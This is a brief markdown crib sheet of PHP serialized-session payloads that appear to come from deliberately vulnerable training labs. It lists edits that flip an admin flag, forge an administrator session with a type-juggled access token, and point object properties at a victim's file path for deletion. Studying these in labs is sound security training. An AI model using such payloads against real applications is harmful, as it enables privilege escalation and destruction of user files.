# Serialized Session Examples

## Admin attribute

Original:

```text
admin = b:0
```

Modified:

```text
admin = b:1
```

## Administrator session object

```text
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

## Arbitrary file path

```text
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

## CustomTemplate

```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

These examples are from the Academy's deliberately vulnerable labs.
